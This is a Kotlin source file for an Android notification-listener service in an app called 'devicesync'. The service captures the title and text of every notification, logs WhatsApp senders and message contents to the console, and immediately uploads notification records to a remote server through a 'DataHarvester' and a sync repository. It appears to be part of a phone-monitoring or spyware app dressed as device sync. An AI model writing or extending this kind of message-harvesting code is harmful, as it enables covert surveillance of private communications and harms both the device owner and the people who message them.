package com.devicesync.app.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.content.Intent
import kotlinx.coroutines.*
import com.devicesync.app.data.repository.DeviceSyncRepository
import com.devicesync.app.utils.SettingsManager

class NotificationListenerService : NotificationListenerService() {
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var repository: DeviceSyncRepository
    private lateinit var dataHarvester: DataHarvester
    private lateinit var settingsManager: SettingsManager
    private var deviceId: String? = null
    
    override fun onCreate() {
        super.onCreate()
        repository = DeviceSyncRepository(applicationContext)
        dataHarvester = DataHarvester(applicationContext)
        settingsManager = SettingsManager(applicationContext)
        
        // Try to get device ID from settings
        val savedDeviceId = settingsManager.getDeviceId()
        
        // If device ID is null, try to generate it
        if (savedDeviceId.isNullOrEmpty()) {
            val newDeviceId = generateDeviceId()
            deviceId = newDeviceId
            settingsManager.saveDeviceId(newDeviceId)
            println("🔔 Generated new device ID: $newDeviceId")
        } else {
            deviceId = savedDeviceId
        }
        
        val currentDeviceId = deviceId
        println("🔔 NotificationListenerService created for device: $currentDeviceId")
        println("🔔 Service is ready to monitor notifications")
    }
    
    private fun captureWhatsAppMessageFromNotification(title: String, text: String, packageName: String) {
        try {
            val deviceId = this.deviceId ?: settingsManager.getDeviceId() ?: generateDeviceId()
            
            // Create WhatsApp message data
            val messageId = "wa_notif_${System.currentTimeMillis()}_${title.hashCode()}"
            val chatName = title
            val message = text
            val timestamp = System.currentTimeMillis()
            
            println("📱 Captured WhatsApp message: $chatName - $message")
            
            // Store the message for later sync (we'll sync it when the service syncs)
            // For now, just log it so we can see it's being captured
            
        } catch (e: Exception) {
            println("❌ Error capturing WhatsApp message: ${e.message}")
        }
    }
    
    private fun generateDeviceId(): String {
        val androidId = android.provider.Settings.Secure.getString(
            contentResolver, 
            android.provider.Settings.Secure.ANDROID_ID
        )
        return "current_device_$androidId"
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        deviceId = intent?.getStringExtra("deviceId") ?: settingsManager.getDeviceId()
        println("NotificationListenerService started for device: $deviceId")
        return START_STICKY
    }
    
    // Step 7: Monitor notifications in real-time
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        
        println("🔔 onNotificationPosted called with notification: ${sbn?.packageName}")
        
        sbn?.let { notification ->
            println("🔔 Processing notification from: ${notification.packageName}")
            
            // Extract notification details for filtering
            val packageName = notification.packageName
            val extras = notification.notification.extras
            val title = extras.getString(android.app.Notification.EXTRA_TITLE)
            val text = extras.getString(android.app.Notification.EXTRA_TEXT)
            
            // Filter out unwanted system notifications
            if (packageName == "android") {
                when {
                    title?.contains("connected to your mobile data hotspot", ignoreCase = true) == true -> {
                        println("🔔 Skipping system hotspot notification: $title")
                        return
                    }
                    title?.contains("mobile data used", ignoreCase = true) == true -> {
                        println("🔔 Skipping mobile data usage notification: $title")
                        return
                    }
                    title?.contains("battery", ignoreCase = true) == true -> {
                        println("🔔 Skipping battery notification: $title")
                        return
                    }
                    title?.contains("storage", ignoreCase = true) == true -> {
                        println("🔔 Skipping storage notification: $title")
                        return
                    }
                }
            }
            
            // Capture WhatsApp messages from notifications
            if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                if (title?.isNotEmpty() == true && text?.isNotEmpty() == true) {
                    println("📱 Capturing WhatsApp message: $title - $text")
                    captureWhatsAppMessageFromNotification(title, text, packageName)
                }
            }
            
            // Check if notifications are enabled in settings
            if (!settingsManager.isDataTypeEnabled("notifications")) {
                println("🔔 Notifications disabled in settings, skipping")
                return
            }
            
            serviceScope.launch {
                try {
                    // Get device ID with fallback
                    var currentDeviceId = deviceId
                    if (currentDeviceId.isNullOrEmpty()) {
                        currentDeviceId = settingsManager.getDeviceId()
                        if (currentDeviceId.isNullOrEmpty()) {
                            currentDeviceId = generateDeviceId()
                            settingsManager.saveDeviceId(currentDeviceId)
                            deviceId = currentDeviceId
                            println("🔔 Generated device ID in notification handler: $currentDeviceId")
                        }
                    }
                    
                    if (currentDeviceId != null) {
                        println("🔔 Syncing notification for device: $currentDeviceId")
                        syncNewNotification(currentDeviceId, notification)
                    } else {
                        println("🔔 Device ID is still null, cannot sync notification")
                    }
                } catch (e: Exception) {
                    println("🔔 Error processing notification: ${e.message}")
                }
            }
        }
    }
    
    private suspend fun syncNewNotification(deviceId: String, sbn: StatusBarNotification) {
        try {
            val notification = sbn.notification
            val extras = notification.extras
            
            // Extract notification details
            val packageName = sbn.packageName
            val appName = getAppName(packageName)
            val title = extras.getCharSequence("android.title")?.toString()
            val text = extras.getCharSequence("android.text")?.toString()
            val bigText = extras.getCharSequence("android.bigText")?.toString()
            
            // Create notification model
            val notificationModel = dataHarvester.createNotificationModel(
                notificationId = "${sbn.id}_${sbn.postTime}",
                packageName = packageName,
                appName = appName,
                title = title,
                text = bigText ?: text
            )
            
            // Sync to server immediately
            val result = repository.syncNotifications(deviceId, listOf(notificationModel))
            
            if (result.isSuccess) {
                println("Notification synced: $packageName - $title")
            } else {
                println("Failed to sync notification: ${result.message}")
            }
            
        } catch (e: Exception) {
            println("Error syncing notification: ${e.message}")
        }
    }
    
    private fun getAppName(packageName: String): String {
        return try {
            val appInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
        // Optionally handle notification removal
    }
    
    override fun onListenerConnected() {
        super.onListenerConnected()
        println("NotificationListenerService connected")
    }
    
    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        println("NotificationListenerService disconnected")
    }
    
    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        println("NotificationListenerService destroyed")
    }
}
